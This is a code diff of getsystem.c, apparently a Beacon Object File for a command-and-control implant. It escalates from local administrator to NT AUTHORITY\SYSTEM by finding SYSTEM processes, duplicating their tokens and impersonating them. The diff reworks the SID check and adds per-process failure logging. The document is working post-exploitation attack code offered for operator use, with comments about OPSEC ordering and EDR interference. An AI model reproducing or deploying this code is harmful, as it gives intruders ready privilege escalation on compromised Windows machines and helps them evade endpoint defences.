@@ -1,17 +1,9 @@
 /*
  * getsystem.c — Elevate to NT AUTHORITY\SYSTEM
  *
- * Single technique: Token duplication from a SYSTEM process.
- * Opens a SYSTEM process (winlogon, services, lsass, etc.),
- * duplicates its token, and impersonates it.
- *
+ * Token duplication from a SYSTEM process.
  * NO threads, NO pipes, NO services, NO child processes.
- * Cannot hang or block. Every API call is synchronous and fast.
- *
- * Requires: LOCAL ADMIN (HIGH integrity)
- *
- * SYSTEM identity check uses direct SID byte comparison against
- * the well-known S-1-5-18 SID — no LookupAccountSidW, no network calls.
+ * Cannot hang or block.
  */
 #include <windows.h>
 #include "beacon_compat.h"
@@ -34,13 +26,13 @@ DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$ImpersonateLoggedOnUser(HANDLE);
 DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$GetTokenInformation(HANDLE, DWORD, LPVOID, DWORD, PDWORD);
 DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$RevertToSelf(void);
 DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$LookupAccountSidW(LPCWSTR, PSID, LPWSTR, LPDWORD, LPWSTR, LPDWORD, PDWORD);
-DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$EqualSid(PSID, PSID);
 
 /* ── ntdll ── */
 DECLSPEC_IMPORT DWORD NTAPI NTDLL$NtQuerySystemInformation(ULONG, PVOID, ULONG, PULONG);
 
 /* ── msvcrt ── */
 DECLSPEC_IMPORT int __cdecl MSVCRT$_wcsicmp(const wchar_t*, const wchar_t*);
+DECLSPEC_IMPORT int __cdecl MSVCRT$memcmp(const void*, const void*, size_t);
 
 /* ── Constants ── */
 #ifndef PROCESS_QUERY_INFORMATION
@@ -72,73 +64,66 @@ DECLSPEC_IMPORT int __cdecl MSVCRT$_wcsicmp(const wchar_t*, const wchar_t*);
 #endif
 
 #define MY_SecurityDelegation       3
+#define MY_SecurityImpersonation    2
 #define MY_TokenImpersonation       2
 #define MY_TokenUser                1
-#define MY_TokenIntegrityLevel      25
 #define SystemProcessInformation    5
 
 /*
- * Well-known SYSTEM SID: S-1-5-18
- * Binary: 01 01 00 00 00 00 00 05 12 00 00 00
- *   Revision=1, SubAuthorityCount=1, Authority={0,0,0,0,0,5}, SubAuth[0]=18 (0x12)
- */
-static const BYTE SYSTEM_SID[] = {
-    0x01, 0x01, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x05,
-    0x12, 0x00, 0x00, 0x00
-};
-
-/*
- * Check if a token belongs to NT AUTHORITY\SYSTEM by comparing
- * the token's user SID against the well-known S-1-5-18 SID.
- * No network calls — pure memory comparison.
+ * Check if a token belongs to NT AUTHORITY\SYSTEM.
+ * Compares the token user SID against well-known S-1-5-18.
+ *
+ * S-1-5-18 in binary:
+ *   Revision=1, SubAuthorityCount=1,
+ *   IdentifierAuthority={0,0,0,0,0,5},
+ *   SubAuthority[0]=18
  */
 static BOOL is_system_token(HANDLE hToken) {
-    BYTE buf[256];
+    BYTE buf[512];
     DWORD needed = 0;
 
     if (!ADVAPI32$GetTokenInformation(hToken, MY_TokenUser, buf, sizeof(buf), &needed))
         return FALSE;
 
-    /* TOKEN_USER starts with SID_AND_ATTRIBUTES: first field is PSID */
+    /* TOKEN_USER layout (x64):
+     *   offset 0: PSID pointer (8 bytes)
+     *   offset 8: DWORD Attributes (4 bytes)
+     * The SID data itself is stored after the structure in the same buffer.
+     */
     PSID pSid = *(PSID*)buf;
+    if (!pSid) return FALSE;
 
-    return ADVAPI32$EqualSid(pSid, (PSID)SYSTEM_SID);
-}
+    /* Parse SID manually:
+     * Byte 0: Revision (must be 1)
+     * Byte 1: SubAuthorityCount
+     * Bytes 2-7: IdentifierAuthority (6 bytes)
+     * Bytes 8+: SubAuthority array (4 bytes each)
+     */
+    BYTE *sidBytes = (BYTE*)pSid;
 
-/*
- * Get display name for verification output.
- * Uses LookupAccountSidW but ONLY called once after successful
- * impersonation — never in a loop, never for SYSTEM check.
- */
-static void get_token_username(HANDLE hToken, char *out, int outLen) {
-    BYTE buf[256];
-    DWORD needed = 0;
-    out[0] = 0;
+    BYTE revision = sidBytes[0];
+    BYTE subAuthCount = sidBytes[1];
 
-    if (!ADVAPI32$GetTokenInformation(hToken, MY_TokenUser, buf, sizeof(buf), &needed))
-        return;
+    /* S-1-5-18: revision=1, 1 sub-authority, authority=5, sub-auth=18 */
+    if (revision != 1) return FALSE;
+    if (subAuthCount != 1) return FALSE;
 
-    PSID pSid = *(PSID*)buf;
-    wchar_t name[128] = {0}, domain[128] = {0};
-    DWORD nameLen = 128, domLen = 128, sidUse = 0;
+    /* Authority bytes [2..7] must be {0,0,0,0,0,5} */
+    if (sidBytes[2] != 0 || sidBytes[3] != 0 || sidBytes[4] != 0 ||
+        sidBytes[5] != 0 || sidBytes[6] != 0 || sidBytes[7] != 5)
+        return FALSE;
 
-    if (ADVAPI32$LookupAccountSidW(NULL, pSid, name, &nameLen, domain, &domLen, &sidUse)) {
-        char aName[128], aDomain[128];
-        KERNEL32$WideCharToMultiByte(CP_UTF8, 0, name, -1, aName, 128, NULL, NULL);
-        KERNEL32$WideCharToMultiByte(CP_UTF8, 0, domain, -1, aDomain, 128, NULL, NULL);
-        int pos = 0;
-        for (int i = 0; aDomain[i] && pos < outLen - 2; i++) out[pos++] = aDomain[i];
-        out[pos++] = '\\';
-        for (int i = 0; aName[i] && pos < outLen - 1; i++) out[pos++] = aName[i];
-        out[pos] = 0;
-    }
+    /* SubAuthority[0] at offset 8, little-endian uint32 = 18 (0x12) */
+    DWORD subAuth = *(DWORD*)(sidBytes + 8);
+    if (subAuth != 18) return FALSE;
+
+    return TRUE;
 }
 
 void go(char *args, int args_len) {
     datap parser;
     BeaconDataParse(&parser, args, args_len);
-    /* int technique = */ BeaconDataInt(&parser); /* ignored — only one technique now */
+    BeaconDataInt(&parser); /* technique arg — ignored, only one technique */
 
     BeaconPrintf(CALLBACK_OUTPUT,
         "[*] GetSystem — token duplication from SYSTEM process\n");
@@ -153,8 +138,8 @@ void go(char *args, int args_len) {
         NULL
     };
 
-    /* Enumerate all processes via NtQuerySystemInformation */
-    ULONG bufSize = 1024 * 1024;
+    /* Enumerate processes */
+    ULONG bufSize = 2 * 1024 * 1024;
     PVOID buffer = KERNEL32$VirtualAlloc(NULL, bufSize,
         MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!buffer) {
@@ -167,38 +152,36 @@ void go(char *args, int args_len) {
     while ((status = NTDLL$NtQuerySystemInformation(
             SystemProcessInformation, buffer, bufSize, &retLen)) == 0xC0000004) {
         KERNEL32$VirtualFree(buffer, 0, MEM_RELEASE);
-        bufSize = retLen + 4096;
+        bufSize = retLen + 8192;
         buffer = KERNEL32$VirtualAlloc(NULL, bufSize,
             MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         if (!buffer) {
-            BeaconPrintf(CALLBACK_ERROR, "[!] VirtualAlloc failed on retry\n");
+            BeaconPrintf(CALLBACK_ERROR, "[!] VirtualAlloc retry failed\n");
             return;
         }
     }
 
     if (status != 0) {
         BeaconPrintf(CALLBACK_ERROR,
-            "[!] NtQuerySystemInformation failed: 0x%08x\n", status);
+            "[!] NtQuerySystemInformation: 0x%08x\n", status);
         KERNEL32$VirtualFree(buffer, 0, MEM_RELEASE);
         return;
     }
 
+    BeaconPrintf(CALLBACK_OUTPUT, "[*] Process list obtained, scanning...\n");
+
     BOOL success = FALSE;
 
-    /* For each target process name (in OPSEC order), scan all PIDs */
     for (int t = 0; targets[t] && !success; t++) {
         BYTE *current = (BYTE*)buffer;
 
         while (1) {
             DWORD nextOffset = *(DWORD*)(current + 0x00);
             DWORD pid        = (DWORD)(*(ULONG_PTR*)(current + 0x48));
-
-            /* Read UNICODE_STRING at offset 0x38 */
             USHORT nameLen   = *(USHORT*)(current + 0x38);
             wchar_t *nameBuf = *(wchar_t**)(current + 0x38 + sizeof(ULONG_PTR));
 
             if (pid > 4 && nameLen > 0 && nameBuf) {
-                /* Build null-terminated copy of process name */
                 wchar_t procName[128];
                 int copyLen = nameLen / 2;
                 if (copyLen > 127) copyLen = 127;
@@ -207,62 +190,73 @@ void go(char *args, int args_len) {
                 procName[copyLen] = 0;
 
                 if (MSVCRT$_wcsicmp(procName, targets[t]) == 0) {
-                    /* Found a matching process — try to dup its token */
+                    char aProc[128] = {0};
+                    KERNEL32$WideCharToMultiByte(CP_UTF8, 0,
+                        procName, -1, aProc, 128, NULL, NULL);
+
+                    /* Step 1: Open the process */
                     HANDLE hProc = KERNEL32$OpenProcess(
                         PROCESS_QUERY_INFORMATION, FALSE, pid);
-                    if (!hProc) goto next_entry;
+                    if (!hProc) {
+                        BeaconPrintf(CALLBACK_OUTPUT,
+                            "    [-] %s (PID %u): OpenProcess failed (%u)\n",
+                            aProc, pid, KERNEL32$GetLastError());
+                        goto next_entry;
+                    }
 
+                    /* Step 2: Open its token */
                     HANDLE hToken = NULL;
                     if (!ADVAPI32$OpenProcessToken(hProc,
                             TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE,
                             &hToken)) {
+                        BeaconPrintf(CALLBACK_OUTPUT,
+                            "    [-] %s (PID %u): OpenProcessToken failed (%u)\n",
+                            aProc, pid, KERNEL32$GetLastError());
                         KERNEL32$CloseHandle(hProc);
                         goto next_entry;
                     }
 
-                    /* Check if this is actually SYSTEM (SID comparison, no network) */
+                    /* Step 3: Verify it's SYSTEM */
                     if (!is_system_token(hToken)) {
+                        BeaconPrintf(CALLBACK_OUTPUT,
+                            "    [-] %s (PID %u): not a SYSTEM token\n",
+                            aProc, pid);
                         KERNEL32$CloseHandle(hToken);
                         KERNEL32$CloseHandle(hProc);
                         goto next_entry;
                     }
 
-                    /* Duplicate as impersonation token */
+                    /* Step 4: Duplicate */
                     HANDLE hDup = NULL;
                     if (!ADVAPI32$DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS,
-                            NULL, MY_SecurityDelegation, MY_TokenImpersonation,
+                            NULL, MY_SecurityImpersonation, MY_TokenImpersonation,
                             &hDup)) {
-                        BeaconPrintf(CALLBACK_ERROR,
-                            "[!] DuplicateTokenEx on PID %u failed: %u\n",
-                            pid, KERNEL32$GetLastError());
+                        BeaconPrintf(CALLBACK_OUTPUT,
+                            "    [-] %s (PID %u): DuplicateTokenEx failed (%u)\n",
+                            aProc, pid, KERNEL32$GetLastError());
                         KERNEL32$CloseHandle(hToken);
                         KERNEL32$CloseHandle(hProc);
                         goto next_entry;
                     }
 
-                    /* Impersonate */
+                    /* Step 5: Impersonate */
                     if (!ADVAPI32$ImpersonateLoggedOnUser(hDup)) {
-                        BeaconPrintf(CALLBACK_ERROR,
-                            "[!] ImpersonateLoggedOnUser failed: %u\n",
-                            KERNEL32$GetLastError());
+                        BeaconPrintf(CALLBACK_OUTPUT,
+                            "    [-] %s (PID %u): ImpersonateLoggedOnUser failed (%u)\n",
+                            aProc, pid, KERNEL32$GetLastError());
                         KERNEL32$CloseHandle(hDup);
                         KERNEL32$CloseHandle(hToken);
                         KERNEL32$CloseHandle(hProc);
                         goto next_entry;
                     }
 
-                    /* Success — log which process we used */
-                    char aProc[128] = {0};
-                    KERNEL32$WideCharToMultiByte(CP_UTF8, 0,
-                        procName, -1, aProc, 128, NULL, NULL);
                     BeaconPrintf(CALLBACK_OUTPUT,
-                        "[+] Duplicated SYSTEM token from %s (PID %u)\n",
-                        aProc, pid);
-
+                        "[+] SYSTEM token from %s (PID %u)\n", aProc, pid);
                     success = TRUE;
-                    /* Don't close hDup — impersonation holds a ref */
+
                     KERNEL32$CloseHandle(hToken);
                     KERNEL32$CloseHandle(hProc);
+                    /* hDup stays open — impersonation holds it */
                     break;
                 }
             }
@@ -275,30 +269,40 @@ next_entry:
     KERNEL32$VirtualFree(buffer, 0, MEM_RELEASE);
 
     if (success) {
-        /* Verify by reading the thread token */
+        /* Verify thread token */
         HANDLE hThreadToken = NULL;
         if (ADVAPI32$OpenThreadToken(KERNEL32$GetCurrentThread(),
                 TOKEN_QUERY, FALSE, &hThreadToken)) {
-            char user[256] = {0};
-            get_token_username(hThreadToken, user, sizeof(user));
-            BeaconPrintf(CALLBACK_OUTPUT,
-                "[+] Thread token: %s\n"
-                "[+] SUCCESS — elevated to NT AUTHORITY\\SYSTEM\n"
-                "[*] Use 'tokenmanip --action revert' to drop impersonation\n",
-                user);
+            /* Resolve name for display (single call, won't loop) */
+            BYTE ubuf[512];
+            DWORD uneeded = 0;
+            if (ADVAPI32$GetTokenInformation(hThreadToken, MY_TokenUser,
+                    ubuf, sizeof(ubuf), &uneeded)) {
+                PSID pSid = *(PSID*)ubuf;
+                wchar_t name[128] = {0}, domain[128] = {0};
+                DWORD nLen = 128, dLen = 128, use = 0;
+                if (ADVAPI32$LookupAccountSidW(NULL, pSid, name, &nLen,
+                        domain, &dLen, &use)) {
+                    char aName[128] = {0}, aDomain[128] = {0};
+                    KERNEL32$WideCharToMultiByte(CP_UTF8, 0, name, -1, aName, 128, NULL, NULL);
+                    KERNEL32$WideCharToMultiByte(CP_UTF8, 0, domain, -1, aDomain, 128, NULL, NULL);
+                    BeaconPrintf(CALLBACK_OUTPUT,
+                        "[+] Thread token: %s\\%s\n", aDomain, aName);
+                }
+            }
             KERNEL32$CloseHandle(hThreadToken);
+            BeaconPrintf(CALLBACK_OUTPUT,
+                "[+] SUCCESS — elevated to SYSTEM\n"
+                "[*] Use 'tokenmanip --action revert' to drop\n");
         } else {
             BeaconPrintf(CALLBACK_ERROR,
-                "[!] Impersonation call succeeded but no thread token set (err: %u)\n",
+                "[!] Impersonation set but OpenThreadToken failed (%u)\n",
                 KERNEL32$GetLastError());
             ADVAPI32$RevertToSelf();
         }
     } else {
         BeaconPrintf(CALLBACK_ERROR,
-            "[!] Failed — could not duplicate a SYSTEM token\n"
-            "[*] Possible reasons:\n"
-            "    - Not running as local admin (need HIGH integrity)\n"
-            "    - All SYSTEM processes denied token access\n"
-            "    - EDR blocked OpenProcess/OpenProcessToken\n");
+            "\n[!] All targets failed — see details above\n"
+            "[*] Need HIGH integrity (run as local admin)\n");
     }
 }
